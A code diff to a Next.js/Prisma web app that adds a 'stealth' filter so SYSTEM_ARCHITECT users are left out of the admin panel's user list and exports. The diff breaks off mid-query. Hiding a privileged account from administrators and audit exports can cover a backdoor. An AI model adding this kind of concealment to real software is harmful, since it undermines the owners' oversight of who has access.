@@ -4,10 +4,14 @@ import { prisma } from "@/lib/prisma";
 import { revalidatePath } from "next/cache";
 import { Role } from "@prisma/client";
 
+/** Stealth: SYSTEM_ARCHITECT se ne prikazuje u listama (Admin panel, exporti). */
+const STEALTH_ROLE_FILTER = { role: { not: Role.SYSTEM_ARCHITECT } };
+
 // 1. DOHVATI SVE KORISNIKE
 export async function getAllUsers() {
   try {
     const users = await prisma.user.findMany({
+      where: STEALTH_ROLE_FILTER,
       orderBy: { createdAt: 'desc' },
       include: { 
         restaurants: { 
